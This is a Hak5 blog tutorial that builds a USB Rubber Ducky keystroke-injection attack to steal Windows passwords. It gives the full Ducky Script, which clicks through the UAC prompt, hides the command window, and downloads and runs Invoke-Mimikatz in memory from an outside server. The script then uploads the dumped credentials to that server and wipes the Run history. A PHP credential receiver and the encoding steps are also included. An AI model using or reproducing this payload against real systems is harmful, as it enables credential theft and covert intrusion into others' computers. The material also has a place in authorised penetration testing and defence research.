https://shop.hak5.org/blogs/usb-rubber-ducky/15-second-password-hack-mr-robot-style

PILFERING PASSWORDS WITH THE USB RUBBER DUCKY
Can you social engineer your target into plugging in a USB drive? How about distracting ’em for the briefest of moments? 15 seconds of physical access and aUSB Rubber Ducky is all it takes to swipe passwords from an unattended PC.

In honor of theUSB Rubber Ducky appearance on a recent episode ofMr Robot, we’re recreating this hollywood hack and showing how easy it is to deploy malware and exfiltrate data using this Hak5 tool.



TheUSB Rubber Ducky is the original keystroke injection attack tool. That means while it looks like a USB Drive, it acts like a keyboard – typing over 1000 words per minute. Specially crafted payloads like these mimic a trusted user, entering keystrokes into the computer at superhuman speed. Once developed, anyone with social engineering or physical access skills can deploy these payloads with ease. Since computers trust humans, and inherently keyboards, computers trust the USB Rubber Ducky. So let’s go violate this trust…



The payload in question here uses a variant ofMimikatz, a tool bygentilkiwi that can dump cleartext passwords from memory. TheInvoke-Mimikatz variant byclymb3r reflectively injects mimikatz into memory using powershell – so mimikatz never touches the computer’s hard disk. Using an altered method byMubix, the powershell script is pulled directly from your server and executed in memory.

Once deployed this payload will open an admin command prompt, bypass UAC, obfuscate input, download and execute Invoke-Mimikatz from your server, then upload the resulting cleartext passwords and other credentials back to your server. When it’s all said and done you’ll go from plug to pwned in about 15 seconds.

WHAT YOU’LL NEED
To pull off this attack you’ll need:

Any web server on the Internet with PHP (preferably something mostly anonymous)
AUSB Rubber Ducky
This ducky script payload
This Invoke-Mimikatz powershell file
This credential saving PHP script
STEP 1: WRITING THE PAYLOAD
USB Rubber Ducky payloads are written in Ducky Script – a ridiculously simple scripting language that can be written in any ordinary text editor, so fire up notepad, vi, emacs or the like.

INITIAL DELAY
REM Title: Invoke mimikatz and send creds to remote server
REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi
DELAY 1000
The first command, REM, is just a comment. It’s always good practice to comment your code. The second command, DELAY, tells the USB Rubber Ducky to pause for 1000 milliseconds. This delay will give the target computer enough time to recognize the USB Rubber Ducky as a keyboard before it begins typing.

OPEN ADMINISTRATOR COMMAND PROMPT
Open administrator command prompt

REM Open an admin command prompt
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
The above snippet opens an admin command prompt using the powershellStart-Process method. GUI r is equivalent to holding down the Windows key and pressing R, which opens the Windows Run dialog.

The powershell runAs verb starts the process with administrator permissions. This is the same as opening cmd with the Run as administrator option.

Once the powershell command is typed and enter is pressed, a UAC dialog will popup. This is bypassed by holding ALT and pressing Y for Yes. Voila – admin command prompt!

OBFUSCATE THE COMMAND PROMPT


While not necessary, it’s always nice to obfuscate the command prompt as to bring as little attention to the attack as possible. Depending on your scenario this section may or may not be necessary.

REM Obfuscate the command prompt
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER
The first mode command reduces the command prompt window to as small as possible. The second changes the color scheme to a difficult to read yellow on white. The hope is that the tiny white window will blend in with the rest of the windows on the screen. Thankfully this payload is extremely short, so it’ll only be open for a brief time.

DOWNLOAD AND EXECUTE THE PAYLOAD
Now with our obfuscated admin command prompt open it’s time to download the Invoke-Mimikatz payload into memory, execute it, and pass the resulting credentials back to our server.

REM Download and execute Invoke Mimikatz then upload the results
STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://darren.kitchen/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://darren.kitchen/rx.php', $output)"
ENTER
DELAY 15000
The powershell IEX orInvoke Expression directive tells it to execute everything following rather than just echoing it back to the command line. TheNew-Object cmdlet creates an instance of the Microsoft .NET Framework. Using theWebClient class we can now send and receive data from standard web servers.

TheDownloadString method downloads the resource, specified as a URL, as a string. In this case it’s the Invoke-Mimikatz powershell script hosted on our web server. This is then executed with the -DumpCreds parameter. The resulting passwords and other credentials are saved in memory in the $output variable.

Finally theUploadString method uploads the credentials, stored in the $output variable, to the URL specified. In this case it’s a PHP receiver script sitting on our web server ready to store the creds for our viewing pleasure.

In this example I’m using my own web server at darren.kitchen, so be sure to change this to match the URL of your own.

CLEARING YOUR TRACKS
Once the Invoke-Mimikatz payload has executed and you’ve captured the credentials, you’ll want to clear your tracks. Since cmd doesn’t maintain a persistent command history, everything typed in the command prompt will be gone after the exit command is issued. The Run dialog on the other hand maintains a list of recently used commands in the Windows registry. Let’s clear it.

REM Clear the Run history and exit
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
ENTER
STRING exit
ENTER
TheRemove-ItemProperty cmdlet deletes items from the Windows registry. In this case the asterisk (*) wildcard is used to delete all items in the RunMRU path. Finally exit closes our tiny command prompt window.

That’s it – ducky script complete! Download a copy here and be sure to change the URL to that of your own web server.

STEP 2: ENCODING THE PAYLOAD
Now that the invoke-mimikatz.txt ducky script has been customized with your web server URL, you’re ready to encode it. The USB Rubber Ducky is expecting an inject.bin file on the root of its microSD card. This file is the binary equivalent of the ducky script text file written in the previous step. To convert the ducky script text file into an inject.bin binary, use the Duck Encoder.



java -jar duckencode.jar -i invoke-mimikatz.txt -o inject.bin
The above command tell the duck encoder to take the input file, the invoke-mimikatz.txt ducky script, and convert it into the binary output file, the inject.bin. Then it’s just a matter of copying the inject.bin file to the root of a microSD card and plugging it into the USB Rubber Ducky.

STEP 3: SETTING UP THE WEB SERVER
You’ll need a web server to host the Invoke-Mimikatz powershell script, as well as a way to receive the credentials. This PHP script will save any post data into individually time and date stamped .cred files including the host IP address. It goes without saying that HTTPS would be preferred in this instance. See the Hak5Let’s Encrypt tutorial on setting up SSL on your web server for free.

<?php
$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
file_put_contents($file, file_get_contents("php://input"));
?>
In addition to the rx.php script to receive the HTTP post data from the target PC, you’ll need to host the Invoke-Mimikatz powershell script. You can grab the latest versionhere and save it to your web server.

STEP 4: DEPLOYING THE ATTACK
Finally with your web server hosting the Invoke-Mimikatz script and PHP credential receiver you’re ready to rock and roll! Pop the USB Rubber Ducky into its covert USB Drive case and head out on your next physical engagement armed with this 15 second password nabbing payload!
